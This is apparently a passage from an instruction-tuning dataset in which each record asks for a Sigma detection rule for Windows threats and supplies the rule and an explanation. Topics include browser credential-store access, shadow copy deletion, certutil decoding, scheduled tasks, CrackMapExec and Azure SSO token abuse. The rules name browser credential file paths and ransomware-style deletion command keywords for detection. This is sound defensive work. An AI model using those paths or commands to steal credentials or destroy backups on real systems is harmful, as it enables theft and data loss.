      "answer": "In order to detect the Hybrid Connection Manager service running on an endpoint, you should monitor the Windows Microsoft Service Bus Client logs for specific event IDs and keywords that indicate unauthorized or suspicious activity. Look for logs with event IDs 40300, 40301, and 40302. These event IDs are critical in identifying potential misuse or unauthorized configuration changes in the Hybrid Connection Manager service. Additionally, pay attention to entries containing specific keywords such as 'HybridConnection', 'sb://', 'servicebus.windows.net', and 'HybridConnectionManage'. These keywords are associated with the configuration and management of Hybrid Connections, which could indicate an attempt to manipulate connection settings or unauthorized access to the service. \n\nIt is important to consider the context in which these logs appear. The presence of these event IDs and keywords does not necessarily imply malicious activity. Legitimate use of Hybrid Connection Manager via Azure function apps could generate similar logs. Therefore, any detection should be contextualized, and further investigation is warranted to determine if the activity is indeed unauthorized or malicious. The significance of monitoring these logs lies in the ability to quickly identify and respond to unauthorized access or configuration changes, which are critical for maintaining the security and integrity of the service. These monitoring practices are aligned with several cyber-security frameworks and protocols designed to protect against unauthorized access and potential data breaches."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious processes based on name and location that access the browser credential stores which can be the sign of credential stealing.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious processes based on name and location that access the browser credential stores which can be the sign of credential stealing, you should monitor file access logs, particularly focusing on the Microsoft-Windows-Kernel-File Event Tracing for Windows (ETW) provider on Windows systems. Pay special attention to the activity involving specific files known to contain browser credentials. For Internet Explorer, watch for access to '\\Appdata\\Local\\Microsoft\\Windows\\WebCache\\WebCacheV01.dat'. For Firefox, be alert for interactions with '\\cookies.sqlite', 'release\\key3.db', 'release\\key4.db', and 'release\\logins.json'. In the case of Chromium-based browsers like Google Chrome, look for access patterns involving '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies', '\\Appdata\\Local\\Chrome\\User Data\\Default\\Login Data', and '\\AppData\\Local\\Google\\Chrome\\User Data\\Local State'.\n\nExclude activities initiated by the system processes, idle parent processes, and well-known directories such as 'C:\\Program Files\\', 'C:\\Program Files (x86)\\', 'C:\\WINDOWS\\system32\\', and 'C:\\WINDOWS\\SysWOW64\\'. Additionally, apply filters to exclude common false positives like antivirus or anti-malware software processes, especially those starting with 'C:\\ProgramData\\Microsoft\\Windows Defender\\' and including 'MpCopyAccelerator.exe' or 'MsMpEng.exe'. Also, consider excluding processes like 'thor64.exe', 'thor.exe', and any child processes of 'C:\\Windows\\System32\\msiexec.exe' to minimize noise from legitimate software and maintenance tools.\n\nThis approach helps in identifying potentially malicious activities aimed at stealing credentials from browsers by narrowing down the focus to unusual file access patterns while filtering out expected behavior from system and known good software processes.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: file_access\n    product: windows\n    definition: 'Requirements: Microsoft-Windows-Kernel-File ETW provider'\ndetection:\n    selection_ie:\n        FileName|endswith: '\\Appdata\\Local\\Microsoft\\Windows\\WebCache\\WebCacheV01.dat'\n    selection_firefox:\n        FileName|endswith:\n            - '\\cookies.sqlite'\n            - 'release\\key3.db'  # Firefox\n            - 'release\\key4.db'  # Firefox\n            - 'release\\logins.json' # Firefox\n    selection_chromium:\n        FileName|contains:\n            - '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies'\n            - '\\Appdata\\Local\\Chrome\\User Data\\Default\\Login Data'\n            - '\\AppData\\Local\\Google\\Chrome\\User Data\\Local State'\n    filter_main_system:\n        Image: System\n        ParentImage: Idle\n    filter_main_generic:\n        # This filter is added to avoid large ammount of FP with 3rd party software. You could remove this in favour of specific filter per-application\n        Image|startswith:\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n            - 'C:\\WINDOWS\\system32\\'\n            - 'C:\\WINDOWS\\SysWOW64\\'\n    filter_optional_defender:\n        Image|startswith: 'C:\\ProgramData\\Microsoft\\Windows Defender\\'\n        Image|endswith:\n            - '\\MpCopyAccelerator.exe'\n            - '\\MsMpEng.exe'\n    filter_optional_thor:\n        Image|endswith:\n            - '\\thor64.exe'\n            - '\\thor.exe'\n    filter_optional_msiexec:\n        ParentImage: 'C:\\Windows\\System32\\msiexec.exe'\n    condition: 1 of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Antivirus, Anti-Spyware, Anti-Malware Software\n    - Backup software\n    - Legitimate software installed on partitions other than \"C:\\\"\n    - Searching software such as \"everything.exe\"\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: file_access\n    product: windows\n    definition: 'Requirements: Microsoft-Windows-Kernel-File ETW provider'\ndetection:\n    selection_ie:\n        FileName|endswith: '\\Appdata\\Local\\Microsoft\\Windows\\WebCache\\WebCacheV01.dat'\n    selection_firefox:\n        FileName|endswith:\n            - '\\cookies.sqlite'\n            - 'release\\key3.db'  # Firefox\n            - 'release\\key4.db'  # Firefox\n            - 'release\\logins.json' # Firefox\n    selection_chromium:\n        FileName|contains:\n            - '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies'\n            - '\\Appdata\\Local\\Chrome\\User Data\\Default\\Login Data'\n            - '\\AppData\\Local\\Google\\Chrome\\User Data\\Local State'\n    filter_main_system:\n        Image: System\n        ParentImage: Idle\n    filter_main_generic:\n        # This filter is added to avoid large ammount of FP with 3rd party software. You could remove this in favour of specific filter per-application\n        Image|startswith:\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n            - 'C:\\WINDOWS\\system32\\'\n            - 'C:\\WINDOWS\\SysWOW64\\'\n    filter_optional_defender:\n        Image|startswith: 'C:\\ProgramData\\Microsoft\\Windows Defender\\'\n        Image|endswith:\n            - '\\MpCopyAccelerator.exe'\n            - '\\MsMpEng.exe'\n    filter_optional_thor:\n        Image|endswith:\n            - '\\thor64.exe'\n            - '\\thor.exe'\n    filter_optional_msiexec:\n        ParentImage: 'C:\\Windows\\System32\\msiexec.exe'\n    condition: 1 of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Antivirus, Anti-Spyware, Anti-Malware Software\n    - Backup software\n    - Legitimate software installed on partitions other than \"C:\\\"\n    - Searching software such as \"everything.exe\"\nlevel: medium\n",
      "question": "suspicious processes based on name and location that access the browser credential stores which can be the sign of credential stealing",
      "answer": "In order to detect suspicious processes based on name and location that access the browser credential stores which can be the sign of credential stealing, you should monitor file access logs, particularly focusing on the Microsoft-Windows-Kernel-File Event Tracing for Windows (ETW) provider on Windows systems. Pay special attention to the activity involving specific files known to contain browser credentials. For Internet Explorer, watch for access to '\\Appdata\\Local\\Microsoft\\Windows\\WebCache\\WebCacheV01.dat'. For Firefox, be alert for interactions with '\\cookies.sqlite', 'release\\key3.db', 'release\\key4.db', and 'release\\logins.json'. In the case of Chromium-based browsers like Google Chrome, look for access patterns involving '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies', '\\Appdata\\Local\\Chrome\\User Data\\Default\\Login Data', and '\\AppData\\Local\\Google\\Chrome\\User Data\\Local State'.\n\nExclude activities initiated by the system processes, idle parent processes, and well-known directories such as 'C:\\Program Files\\', 'C:\\Program Files (x86)\\', 'C:\\WINDOWS\\system32\\', and 'C:\\WINDOWS\\SysWOW64\\'. Additionally, apply filters to exclude common false positives like antivirus or anti-malware software processes, especially those starting with 'C:\\ProgramData\\Microsoft\\Windows Defender\\' and including 'MpCopyAccelerator.exe' or 'MsMpEng.exe'. Also, consider excluding processes like 'thor64.exe', 'thor.exe', and any child processes of 'C:\\Windows\\System32\\msiexec.exe' to minimize noise from legitimate software and maintenance tools.\n\nThis approach helps in identifying potentially malicious activities aimed at stealing credentials from browsers by narrowing down the focus to unusual file access patterns while filtering out expected behavior from system and known good software processes."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Shadow Copies deletion using operating systems utilities.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect attempts to delete Shadow Copies using operating systems utilities, you should monitor for process creation events on Windows systems where the process name ends with 'powershell.exe', 'pwsh.exe', 'wmic.exe', 'vssadmin.exe', diskshadow.exe', or 'wbadmin.exe'. Additionally, ensure to check the original filename for matches including 'PowerShell.EXE', 'pwsh.dll', 'wmic.exe', 'VSSADMIN.EXE', 'diskshadow.exe', and 'WBADMIN.EXE', which indicates the execution of these processes. Look for command line arguments which involve keywords such as 'shadow' and 'delete' together for powershell.exe, pwsh.exe, wmic.exe, vssadmin.exe, and diskshadow.exe, signifying attempts to delete shadow copies or modify shadow storage. For 'wbadmin.exe', ensure the command line contains 'delete', 'catalog', and 'quiet', which suggests an attempt to quietly delete backup catalogs. Furthermore, for 'vssadmin.exe', be alert for command line arguments that include 'resize', 'shadowstorage', along with 'unbounded' or '/MaxSize=', indicating an attempt to resize the shadow storage to a minimal or unspecified size, effectively removing shadow copies. It's important to capture both command line and parent command line inputs for a comprehensive analysis. Be aware of false positives, which may arise from legitimate administrative activities such as deliberate shadow copies deletion for system maintenance or specific software operations known to mimic this behavior. The threat level for this detection is high due to its association with tactics aimed at obstructing data recovery efforts and potentially facilitating ransomware attacks or other malicious activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1_img:\n        - Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wmic.exe'\n            - '\\vssadmin.exe'\n            - '\\diskshadow.exe'\n        - OriginalFileName:\n            - 'PowerShell.EXE'\n            - 'pwsh.dll'\n            - 'wmic.exe'\n            - 'VSSADMIN.EXE'\n            - 'diskshadow.exe'\n    selection1_cli:\n        CommandLine|contains|all:\n            - 'shadow'  # will match \"delete shadows\" and \"shadowcopy delete\" and \"shadowstorage\"\n            - 'delete'\n    selection2_img:\n        - Image|endswith: '\\wbadmin.exe'\n        - OriginalFileName: 'WBADMIN.EXE'\n    selection2_cli:\n        CommandLine|contains|all:\n            - 'delete'\n            - 'catalog'\n            - 'quiet' # will match -quiet or /quiet\n    selection3_img:\n        - Image|endswith: '\\vssadmin.exe'\n        - OriginalFileName: 'VSSADMIN.EXE'\n    selection3_cli:\n        CommandLine|contains|all:\n            - 'resize'\n            - 'shadowstorage'\n        CommandLine|contains:\n            - 'unbounded'\n            - '/MaxSize='\n    condition: (all of selection1*) or (all of selection2*) or (all of selection3*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate Administrator deletes Shadow Copies using operating systems utilities for legitimate reason\n    - LANDesk LDClient Ivanti-PSModule (PS EncodedCommand)\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1_img:\n        - Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wmic.exe'\n            - '\\vssadmin.exe'\n            - '\\diskshadow.exe'\n        - OriginalFileName:\n            - 'PowerShell.EXE'\n            - 'pwsh.dll'\n            - 'wmic.exe'\n            - 'VSSADMIN.EXE'\n            - 'diskshadow.exe'\n    selection1_cli:\n        CommandLine|contains|all:\n            - 'shadow'  # will match \"delete shadows\" and \"shadowcopy delete\" and \"shadowstorage\"\n            - 'delete'\n    selection2_img:\n        - Image|endswith: '\\wbadmin.exe'\n        - OriginalFileName: 'WBADMIN.EXE'\n    selection2_cli:\n        CommandLine|contains|all:\n            - 'delete'\n            - 'catalog'\n            - 'quiet' # will match -quiet or /quiet\n    selection3_img:\n        - Image|endswith: '\\vssadmin.exe'\n        - OriginalFileName: 'VSSADMIN.EXE'\n    selection3_cli:\n        CommandLine|contains|all:\n            - 'resize'\n            - 'shadowstorage'\n        CommandLine|contains:\n            - 'unbounded'\n            - '/MaxSize='\n    condition: (all of selection1*) or (all of selection2*) or (all of selection3*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate Administrator deletes Shadow Copies using operating systems utilities for legitimate reason\n    - LANDesk LDClient Ivanti-PSModule (PS EncodedCommand)\nlevel: high\n",
      "question": "Shadow Copies deletion using operating systems utilities",
      "answer": "In order to detect attempts to delete Shadow Copies using operating systems utilities, you should monitor for process creation events on Windows systems where the process name ends with 'powershell.exe', 'pwsh.exe', 'wmic.exe', 'vssadmin.exe', diskshadow.exe', or 'wbadmin.exe'. Additionally, ensure to check the original filename for matches including 'PowerShell.EXE', 'pwsh.dll', 'wmic.exe', 'VSSADMIN.EXE', 'diskshadow.exe', and 'WBADMIN.EXE', which indicates the execution of these processes. Look for command line arguments which involve keywords such as 'shadow' and 'delete' together for powershell.exe, pwsh.exe, wmic.exe, vssadmin.exe, and diskshadow.exe, signifying attempts to delete shadow copies or modify shadow storage. For 'wbadmin.exe', ensure the command line contains 'delete', 'catalog', and 'quiet', which suggests an attempt to quietly delete backup catalogs. Furthermore, for 'vssadmin.exe', be alert for command line arguments that include 'resize', 'shadowstorage', along with 'unbounded' or '/MaxSize=', indicating an attempt to resize the shadow storage to a minimal or unspecified size, effectively removing shadow copies. It's important to capture both command line and parent command line inputs for a comprehensive analysis. Be aware of false positives, which may arise from legitimate administrative activities such as deliberate shadow copies deletion for system maintenance or specific software operations known to mimic this behavior. The threat level for this detection is high due to its association with tactics aimed at obstructing data recovery efforts and potentially facilitating ransomware attacks or other malicious activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of certutil with either the \"decode\" or \"decodehex\" flags to decode base64 or hex encoded files. This can be abused by attackers to decode an encoded payload before execution.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of certutil with either the \"decode\" or \"decodehex\" flags to decode base64 or hex encoded files, which can be abused by attackers to decode an encoded payload before execution, you should: Monitor Windows process creation logs for instances where the process image ends with '\\certutil.exe' or has an OriginalFileName of 'CertUtil.exe'. Additionally, look for command-line executions containing either '-decode ', '/decode ', '-decodehex ', or '/decodehex ' to identify the specific use of certutil for decoding base64 or hex encoded files. It's important to consider all these selection criteria together to accurately identify potential malicious activity. While monitoring, be aware that there can be legitimate uses of these certutil commands, so unknown instances should be considered as potential false positives, rated at a medium level of concern. This approach aids in recognizing tactics and techniques resembling the usage of encoding/decoding in the attack lifecycle, without labeling it under specific MITRE ATT&CK taxonomy.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains:\n            # Decode Base64\n            - '-decode '\n            - '/decode '\n            # Decode Hex\n            - '-decodehex '\n            - '/decodehex '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains:\n            # Decode Base64\n            - '-decode '\n            - '/decode '\n            # Decode Hex\n            - '-decodehex '\n            - '/decodehex '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "execution of certutil with either the \"decode\" or \"decodehex\" flags to decode base64 or hex encoded files. This can be abused by attackers to decode an encoded payload before execution",
      "answer": "In order to detect the execution of certutil with either the \"decode\" or \"decodehex\" flags to decode base64 or hex encoded files, which can be abused by attackers to decode an encoded payload before execution, you should: Monitor Windows process creation logs for instances where the process image ends with '\\certutil.exe' or has an OriginalFileName of 'CertUtil.exe'. Additionally, look for command-line executions containing either '-decode ', '/decode ', '-decodehex ', or '/decodehex ' to identify the specific use of certutil for decoding base64 or hex encoded files. It's important to consider all these selection criteria together to accurately identify potential malicious activity. While monitoring, be aware that there can be legitimate uses of these certutil commands, so unknown instances should be considered as potential false positives, rated at a medium level of concern. This approach aids in recognizing tactics and techniques resembling the usage of encoding/decoding in the attack lifecycle, without labeling it under specific MITRE ATT&CK taxonomy."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of scheduled tasks in user session.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of scheduled tasks in user sessions, you should focus on monitoring process creation events within Windows operating systems. Specifically, pay attention to instances where the 'schtasks.exe' process is executed, which is indicated by the end of the process image path. Moreover, look for commands that include ' /create ', signifying an attempt to create a new scheduled task. It's also important to filter out any activities where the User field contains language settings that are indicative of authorized or automated system activities, commonly including terms like 'AUTHORI' or 'AUTORI', to reduce false positive alerts due to legitimate administrative activities or software installations. Keep an eye on the command line used for process creation and the parent process's command line to catch malicious attempts. This approach aims at a low level of alert severity due to the potential for legitimate uses of scheduled task creation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains: ' /create '\n    filter:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    condition: selection and not filter\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative activity\n    - Software installation\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains: ' /create '\n    filter:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    condition: selection and not filter\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative activity\n    - Software installation\nlevel: low\n",
      "question": "creation of scheduled tasks in user session",
      "answer": "In order to detect the creation of scheduled tasks in user sessions, you should focus on monitoring process creation events within Windows operating systems. Specifically, pay attention to instances where the 'schtasks.exe' process is executed, which is indicated by the end of the process image path. Moreover, look for commands that include ' /create ', signifying an attempt to create a new scheduled task. It's also important to filter out any activities where the User field contains language settings that are indicative of authorized or automated system activities, commonly including terms like 'AUTHORI' or 'AUTORI', to reduce false positive alerts due to legitimate administrative activities or software installations. Keep an eye on the command line used for process creation and the parent process's command line to catch malicious attempts. This approach aims at a low level of alert severity due to the potential for legitimate uses of scheduled task creation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Csi.exe is a signed binary from Microsoft that comes with Visual Studio and provides C# interactive capabilities. It can be used to run C# code from a file passed as a parameter in command line. Early version of this utility provided with Microsoft \u201cRoslyn\u201d Community Technology Preview was named 'rcsi.exe'.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential abuse of the 'csi.exe' and 'rcsi.exe' binaries which are legitimate Microsoft-signed executables from Visual Studio and are intended for running C# code interactively, often through the command line, you should:\n\nMonitor for the creation of processes that are named 'csi.exe' or 'rcsi.exe'. This can be identified when the executable image ends with these specific names or when the original file name matches 'csi.exe' or 'rcsi.exe'. Additionally, any command-line invocation of these executables coming from an entity identified as 'Microsoft Corporation' should be closely scrutinized. It's essential to capture key details such as the computer name, user account, full command line used to launch the process, and the parent command line if available. This allows for a comprehensive understanding of the context surrounding potential misuse. However, it\u2019s important to note that these utilities might be legitimately used by software developers; thus, some alerts might represent false positives. The monitoring approach should consider the balance between detecting malicious activity and minimizing interruptions to legitimate software development practices. These checks mainly focus on the tactics and techniques related to the execution phase of an attack, specifically monitoring the execution of Windows processes that could potentially be abused by attackers.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\csi.exe'\n            - '\\rcsi.exe'\n        - OriginalFileName:\n            - 'csi.exe'\n            - 'rcsi.exe'\n    selection_cli:\n        Company: 'Microsoft Corporation'\n    condition: all of selection*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate usage by software developers\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\csi.exe'\n            - '\\rcsi.exe'\n        - OriginalFileName:\n            - 'csi.exe'\n            - 'rcsi.exe'\n    selection_cli:\n        Company: 'Microsoft Corporation'\n    condition: all of selection*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate usage by software developers\nlevel: medium\n",
      "question": "Csi.exe is a signed binary from Microsoft that comes with Visual Studio and provides C# interactive capabilities. It can be used to run C# code from a file passed as a parameter in command line. Early version of this utility provided with Microsoft \u201cRoslyn\u201d Community Technology Preview was named 'rcsi.exe'",
      "answer": "In order to detect potential abuse of the 'csi.exe' and 'rcsi.exe' binaries which are legitimate Microsoft-signed executables from Visual Studio and are intended for running C# code interactively, often through the command line, you should:\n\nMonitor for the creation of processes that are named 'csi.exe' or 'rcsi.exe'. This can be identified when the executable image ends with these specific names or when the original file name matches 'csi.exe' or 'rcsi.exe'. Additionally, any command-line invocation of these executables coming from an entity identified as 'Microsoft Corporation' should be closely scrutinized. It's essential to capture key details such as the computer name, user account, full command line used to launch the process, and the parent command line if available. This allows for a comprehensive understanding of the context surrounding potential misuse. However, it\u2019s important to note that these utilities might be legitimately used by software developers; thus, some alerts might represent false positives. The monitoring approach should consider the balance between detecting malicious activity and minimizing interruptions to legitimate software development practices. These checks mainly focus on the tactics and techniques related to the execution phase of an attack, specifically monitoring the execution of Windows processes that could potentially be abused by attackers."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of suspicious files and folders inside the user's AppData folder but not inside any of the common and well known directories (Local, Romaing, LocalLow). This method could be used as a method to bypass detection who exclude the AppData folder in fear of FPs.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of suspicious files and folders inside the user's AppData folder but not inside any of the common and well-known directories (Local, Roaming, LocalLow), which could be used as a method to bypass detection mechanisms that exclude the AppData folder fearing false positives, you should: monitor for the creation of files with specific extensions (.bat, .cmd, .cpl, .dll, .exe, .hta, .iso, .lnk, .msi, .ps1, .psm1, .scr, .vbe, .vbs) within the AppData directory of a user's profile on Windows, but specifically exclude those created in the more frequently used subdirectories such as AppData\\Local, AppData\\LocalLow, and AppData\\Roaming. This approach aims to highlight potentially malicious activities occurring outside the typical usage patterns, by focusing on less commonly watched folders within AppData, thereby increasing the likelihood of detecting attempts to evade standard security measures.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|startswith: 'C:\\Users\\'\n        TargetFilename|contains: '\\AppData\\'\n        TargetFilename|endswith:\n            # Add more as needed\n            - '.bat'\n            - '.cmd'\n            - '.cpl'\n            - '.dll'\n            - '.exe'\n            - '.hta'\n            - '.iso'\n            - '.lnk'\n            - '.msi'\n            - '.ps1'\n            - '.psm1'\n            - '.scr'\n            - '.vbe'\n            - '.vbs'\n    filter_main:\n        TargetFilename|startswith: 'C:\\Users\\'\n        TargetFilename|contains:\n            - '\\AppData\\Local\\'\n            - '\\AppData\\LocalLow\\'\n            - '\\AppData\\Roaming\\'\n    condition: selection and not filter_main\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|startswith: 'C:\\Users\\'\n        TargetFilename|contains: '\\AppData\\'\n        TargetFilename|endswith:\n            # Add more as needed\n            - '.bat'\n            - '.cmd'\n            - '.cpl'\n            - '.dll'\n            - '.exe'\n            - '.hta'\n            - '.iso'\n            - '.lnk'\n            - '.msi'\n            - '.ps1'\n            - '.psm1'\n            - '.scr'\n            - '.vbe'\n            - '.vbs'\n    filter_main:\n        TargetFilename|startswith: 'C:\\Users\\'\n        TargetFilename|contains:\n            - '\\AppData\\Local\\'\n            - '\\AppData\\LocalLow\\'\n            - '\\AppData\\Roaming\\'\n    condition: selection and not filter_main\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "creation of suspicious files and folders inside the user's AppData folder but not inside any of the common and well known directories (Local, Romaing, LocalLow). This method could be used as a method to bypass detection who exclude the AppData folder in fear of FPs",
      "answer": "In order to detect the creation of suspicious files and folders inside the user's AppData folder but not inside any of the common and well-known directories (Local, Roaming, LocalLow), which could be used as a method to bypass detection mechanisms that exclude the AppData folder fearing false positives, you should: monitor for the creation of files with specific extensions (.bat, .cmd, .cpl, .dll, .exe, .hta, .iso, .lnk, .msi, .ps1, .psm1, .scr, .vbe, .vbs) within the AppData directory of a user's profile on Windows, but specifically exclude those created in the more frequently used subdirectories such as AppData\\Local, AppData\\LocalLow, and AppData\\Roaming. This approach aims to highlight potentially malicious activities occurring outside the typical usage patterns, by focusing on less commonly watched folders within AppData, thereby increasing the likelihood of detecting attempts to evade standard security measures."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting CrackMapExecWin Activity as Described by NCSC.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect CrackMapExecWin activity as described by NCSC, you should: monitor for the creation of processes on Windows systems where the process image name ends with '\\crackmapexec.exe'. This activity is critical to notice as it involves the use of CrackMapExec, a swiss army knife tool for pentesters, which focuses on the automation of assessing large Active Directory networks. There are no known benign instances where this execution would occur, marking any detection as critical and warranting immediate investigation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\crackmapexec.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\crackmapexec.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "CrackMapExecWin Activity as Described by NCSC",
      "answer": "In order to detect CrackMapExecWin activity as described by NCSC, you should: monitor for the creation of processes on Windows systems where the process image name ends with '\\crackmapexec.exe'. This activity is critical to notice as it involves the use of CrackMapExec, a swiss army knife tool for pentesters, which focuses on the automation of assessing large Active Directory networks. There are no known benign instances where this execution would occur, marking any detection as critical and warranting immediate investigation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting abusing Azure Browser SSO by requesting OAuth 2.0 refresh tokens for an Azure-AD-authenticated Windows user (i.e. the machine is joined to Azure AD and a user logs in with their Azure AD account) wanting to perform SSO authentication in the browser.\nAn attacker can use this to authenticate to Azure AD in a browser as that user.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect abusing Azure Browser SSO by requesting OAuth 2.0 refresh tokens for an Azure-AD-authenticated Windows user (i.e. the machine is joined to Azure AD and a user logs in with their Azure AD account) wanting to perform SSO authentication in the browser. An attacker can use this to authenticate to Azure AD in a browser as that user, you should: monitor for the loading of the MicrosoftAccountTokenProvider.dll from the C:\\Windows\\System32 directory on Windows systems. This detection is based on the premise that during an attack attempting to exploit Azure Browser SSO for unauthorized authentication via OAuth 2.0 refresh tokens, the MicrosoftAccountTokenProvider.dll would be crucial since it is linked to handling of Microsoft account tokens.\n\nTo refine the detection and minimize false positives, it's advisable to exclude events where the loaded images are part of legitimate background tasks, including tasks started by BackgroundTaskHost.exe located either in the System32 or SysWOW64 directories. Similarly, activities initiated by recognized developer tools like Microsoft Visual Studio, browsers such as Internet Explorer or Microsoft Edge, as well as OneDrive, should also be considered as exceptions unless other suspicious activities correlate.\n\nThis monitoring strategy leverages the understanding that simply loading the said DLL can occur in non-malicious scenarios. Therefore, alerting on this event alone is classified with a low-level severity. It is most effective when this activity is correlated with other suspicious actions that could indicate an attack aimed at misusing Azure Browser SSO features to gain unauthorized access. The tags associated with this attack would relate to techniques that abuse legitimate authentication processes to perform unauthorized actions, reflecting an exploitation of trusted processes for malicious purposes.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        ImageLoaded: 'C:\\Windows\\System32\\MicrosoftAccountTokenProvider.dll'\n    filter_main_bgtaskhost:\n        Image|startswith:\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SysWOW64\\'\n        Image|endswith: '\\BackgroundTaskHost.exe'\n        #CommandLine|contains: '-ServerNameBackgroundTaskHost.WebAccountProvider'\n    filter_optional_devenv:\n        Image|startswith:\n            - 'C:\\Program Files\\Microsoft Visual Studio\\'\n            - 'C:\\Program Files (x86)\\Microsoft Visual Studio\\'\n        Image|endswith: '\\IDE\\devenv.exe'\n    filter_optional_ie:\n        Image:\n            - 'C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe'\n            - 'C:\\Program Files\\Internet Explorer\\iexplore.exe'\n    filter_optional_edge_1:\n        - Image|startswith: 'C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\'\n        - Image|endswith: '\\WindowsApps\\MicrosoftEdge.exe'\n        - Image:\n            - 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'\n            - 'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe'\n    filter_optional_edge_2:\n        Image|startswith:\n            - 'C:\\Program Files (x86)\\Microsoft\\EdgeCore\\'\n            - 'C:\\Program Files\\Microsoft\\EdgeCore\\'\n        Image|endswith:\n            - '\\msedge.exe'\n            - '\\msedgewebview2.exe'\n    filter_optional_onedrive:\n        Image|endswith: 